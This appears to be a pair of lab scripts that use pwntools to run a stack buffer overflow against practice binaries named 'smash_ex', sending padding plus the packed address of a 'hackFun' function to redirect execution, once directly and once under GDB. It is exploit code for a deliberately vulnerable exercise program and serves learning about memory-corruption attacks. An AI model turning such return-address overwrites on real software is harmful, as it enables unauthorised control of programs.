--------------------------
#For attacking the stack protected version

from pwn import *
prog = pwnlib.elf.load('smash_ex.stack-protect.exe')
fun_addr = prog.symbols['hackFun']
print(fun_addr)

p = process('./smash_ex.exe')
lines = p.readlines(4)
for line in lines:
  print(line.decode())
# Figure out how far away it is, need that distance + 8
# Create the right packed address
bytes_to_send = b'00000000'*3 + p64(fun_addr, 'little')

p.send(bytes_to_send)
lines = p.readall()
for line in lines:
  print(line.decode())

--------------------------
# Playing around with the GDB version
# Import everything in the pwntools namespace
from pwn import *


binary = pwnlib.elf.load('smash_ex.exe')
#binary = pwnlib.elf.load('smash_ex.stack-protect.exe')
fun_addr = binary.symbols['hackFun']
print(fun_addr)

# Create an instance of the process to talk to
io = gdb.debug('./smash_ex.stack-protect.exe')

# `continue` in the gdb window
io.readlines(4)

bytes_to_send = b'abcdefgh'*3 + p64(fun_addr, 'little')
io.send(bytes_to_send)
io.readall()

